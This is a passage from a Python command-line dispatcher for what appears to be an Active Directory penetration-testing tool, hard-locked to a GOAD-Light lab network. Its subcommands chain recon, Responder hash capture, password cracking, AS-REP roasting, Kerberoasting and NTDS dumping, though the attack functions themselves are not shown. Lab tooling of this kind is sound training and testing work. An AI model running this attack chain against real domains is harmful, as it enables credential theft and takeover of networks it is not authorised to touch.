    sub.add_parser("collect-responder")
    crack = sub.add_parser("crack")
    crack.add_argument("wordlist", type=Path)
    sub.add_parser("validate")
    sub.add_parser("authenticated-enum")
    sub.add_parser("kerberoast")
    auto = sub.add_parser("auto")
    auto.add_argument("--interface")
    auto.add_argument("--wordlist", type=Path, required=True)
    auto.add_argument("--responder-seconds", type=int, default=420)
    sub.add_parser("report")
    sub.add_parser("status")
    sub.add_parser("dump-ntds")
    return parser


def main() -> int:
    ensure_dirs()
    if not CONFIG.is_file():
        raise AssessmentError(f"missing configuration: {CONFIG}")
    config = parse_env(CONFIG)
    network = ipaddress.ip_network(config["LAB_CIDR"], strict=True)
    if str(network) != "192.168.56.0/24":
        raise AssessmentError("this build is locked to the documented GOAD-Light lab scope")
    args = build_parser().parse_args()
    state = load_state(str(network))

    if args.command == "run":
        run_all(state, network)
    elif args.command == "doctor":
        doctor(network)
    elif args.command == "recon":
        recon(state, network)
    elif args.command == "enumerate":
        anonymous_enumeration(state)
    elif args.command == "asrep":
        asrep_discovered_users(state)
    elif args.command == "responder":
        responder_capture(state, network, args.interface, args.seconds)
    elif args.command == "collect-responder":
        collect_responder(state)
    elif args.command == "crack":
        crack_hashes(state, args.wordlist)
    elif args.command == "validate":
        validate_credentials(state)
    elif args.command == "authenticated-enum":
        authenticated_collection(state)
    elif args.command == "kerberoast":
        kerberoast(state)
    elif args.command == "auto":
        auto_assess(state, network, args.interface, args.wordlist, args.responder_seconds)
    elif args.command == "report":
        print(generate_report(state))
    elif args.command == "status":
        print(json.dumps({key: state[key] for key in ("scope", "hosts", "domains", "users", "hashes", "access", "domain_admins")}, indent=2))
    elif args.command == "dump-ntds":
        print(dump_ntds(state))
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (AssessmentError, KeyError, ValueError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(1)
